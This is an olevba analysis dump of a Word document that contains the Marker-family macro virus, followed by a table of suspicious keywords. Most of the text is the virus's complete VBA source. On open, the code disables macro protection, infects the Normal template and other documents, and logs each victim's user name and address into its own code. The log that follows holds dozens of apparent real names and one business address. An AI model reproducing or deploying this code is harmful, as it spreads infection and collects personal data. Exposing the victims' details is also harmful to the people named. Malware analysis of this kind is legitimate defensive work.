olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ga-f0c355a7920e0bd99fb5655dd79d48e6b5d188f2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ga-f0c355a7920e0bd99fb5655dd79d48e6b5d188f2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Влом было макросы писать
































































Private Sub Document_Open()

On Error Resume Next

Const test = "Это не вирус. Просто прикол ;)"

'Объявление переменных
Dim SaveDocument, SaveNormalTemplate, DocumentPrepared, NormalTemplatePrepared As Boolean
Dim ad, nt As Object
Dim Code, UserAddress, LogData, LogFile As String

'Инициализация переменных
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
NormalTemplatePrepared = nt.CodeModule.Find(test, 0, 0, 0, 0)

Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
DocumentPrepared = ad.CodeModule.Find(test, 0, 0, 0, 0)

'Чуток меняем опции для оптимизации работы
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.ReadOnlyRecommended = False

'Заражаем NormalTemplate
If (ad.CodeModule.Find(test, 0, 0, 0, 0) = True And _
    nt.CodeModule.Find(test, 0, 0, 0, 0) = False) Then
   
    Code = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i
   
    Code = Code & Chr(13) & _
              "' " & Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)
 
    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString Code
End If

'Заражаем активный документ
If nt.CodeModule.Find(test, 0, 0, 0, 0) = True And _
  ad.CodeModule.Find(test, 0, 0, 0, 0) = False Then

  Code = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
  ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
  ad.CodeModule.AddFromString Code
End If

'если пятница, тринадцатое, то хана тачке
If (Day(Now()) = 13) And (WeekDay(Now()) = 6) Then
  Value = MsgBox("Сегодня пятница, 13. Следовательно, на вашей тачке страшный вирус! Хи-хи :) Будем лечить?", vbYesNo)
  If Value = vbYes Then
    MsgBox ("А-а-а-а!!! Не лечится... Хана тачке :(((")
  Else
    MsgBox ("Правильное решение. Тупая шутка")
  End If
End If

  If Right(Application.UserName, 4) <> "лох!" Then
    Application.UserName = Application.UserName + " - лох!"
  End If
  ActiveDocument.Save
  
End Sub


























































'Фух, наконец-то клавишу Enter отжал :o)
' Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet - лох!
'



' Saturday, 28 Nov 1998
' MARK B. SEAY - лох!
'



' Friday, 4 Dec 1998
' UPS - лох!
'



' Thursday, 17 Dec 1998
' WRO - лох!
'



' Tuesday, 22 Dec 1998
' bd04619 - лох!
'



' Monday, 4 Jan 1999
' ss04789 - лох!
'



' Wednesday, 6 Jan 1999
' JDIETZ - лох!
'



' Saturday, 23 Jan 1999
' W95INST - лох!
'



' Tuesday, 26 Jan 1999
' cbreivis - лох!
'



' Monday, 1 Feb 1999
' C & L User - лох!
'



' Friday, 5 Feb 1999
' Davidson - лох!
'



' Monday, 8 Feb 1999
' uperstl
'



' Tuesday, 16 Feb 1999
' rkeeble - лох!
'



' Thursday, 18 Feb 1999
' pcosgrov - лох!
'



' Friday, 19 Feb 1999
' lyoung - лох!
'



' Tuesday, 23 Feb 1999
' Giuseppe Bacco - лох!
'



' Tuesday, 23 Feb 1999
' jstewart - лох!
'



' вторник, 2 мар 1999
' Korneyev - лох!
' Україна, 252030, м.Київ, вул. Б.Хмельницького, 46
' ТОВ "Перспектива-ТБ"



' понедельник, 3 мар 1997
' Administrator - лох!
'



' понедельник, 22 мар 1999
' den - лох!
'



' пятница, 2 апр 1999
' Дядюн - лох!
'



' пятница, 9 апр 1999
' AMI - лох!
'



' середа, 21 Кві 1999
' sFire - лох!
'



' воскресенье, 16 май 1999
' все кому не лень - лох!
'



' понедельник, 17 май 1999
' максим - лох!
'



' среда, 26 май 1999
' Сергей - лох!
'



' среда, 26 май 1999
' Sergey - лох!
'



' среда, 2 июн 1999
' АВЕРЬЯНОВА ДАРЬЯ ПЕТРОВНА - лох!
'



' четверг, 15 июл 1999
' st06 - лох!
'



' вторник, 20 июл 1999
' ST5 - лох!
'



' понедельник, 1 янв 1996
' Averin Dm. G. - лох!
'



' понедельник, 4 окт 1999
' V.Strunilin - лох!
'



' пятница, 26 ноя 1999
' - лох!
'



' понедельник, 20 дек 1999
' - лох!
'



' среда, 22 дек 1999
' sv - лох!
'



' вторник, 28 дек 1999
' sv - лох!
'



' вторник, 22 фев 2000
' Александров  С.А. - лох!
'



' воскресенье, 28 май 2000
' Мормуль Сергей Петрович - лох!
'



' понедельник, 11 сен 2000
' Мормуль Сергей Петрович - лох!
'



' воскресенье, 1 окт 2000
' МСП - лох!
'



' вторник, 28 ноя 2000
' Лисицкий Игорь Сергеевич - лох!
'



' среда, 6 дек 2000
' STV
'



' пятница, 12 янв 2001
' МИЩЕНКО В В
'



' вторник, 16 янв 2001
' МИЩЕНКО В В - лох!
'



' четверг, 18 янв 2001
' Room13 - лох!
'



' понедельник, 29 янв 2001
' КОРНЕЕВА ИРА
'



' вторник, 30 янв 2001
' POST
'



' вторник, 30 янв 2001
' Дежурная часть
'



' среда, 7 фев 2001
' YANKOVSKAYA
'



' четвер, 26 Кві 2001
' Татьяна
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
